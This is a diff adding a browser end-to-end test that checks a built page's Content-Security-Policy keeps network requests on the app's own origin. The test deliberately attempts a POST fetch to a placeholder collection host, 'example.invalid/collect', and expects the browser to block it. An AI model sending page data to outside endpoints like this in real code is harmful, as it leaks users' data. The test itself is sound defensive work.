@@ -74,3 +74,22 @@ test("config.json loads from the base path", async ({ page, baseURL }) => {
   }
   expect(configs).toEqual([`${basePath}config.json`, `${basePath}config.json`]);
 });
+
+test("the built page's Content-Security-Policy keeps fetches on the app's origin", async ({ page }) => {
+  await page.goto("verify");
+  const csp = await page
+    .locator('meta[http-equiv="Content-Security-Policy"]')
+    .getAttribute("content");
+  expect(csp).toContain("connect-src 'self'");
+  expect(csp).toContain("default-src 'self'");
+  // The browser refuses before any request is made.
+  const blocked = await page.evaluate(() =>
+    fetch("https://example.invalid/collect", { method: "POST", body: "x" }).then(
+      () => "sent",
+      () => "blocked",
+    ),
+  );
+  expect(blocked).toBe("blocked");
+  const violations = await page.evaluate(() => (globalThis as unknown as { __csp: string[] }).__csp.splice(0));
+  expect(violations).toEqual([expect.stringMatching(/^connect-src https:\/\/example\.invalid/)]);
+});
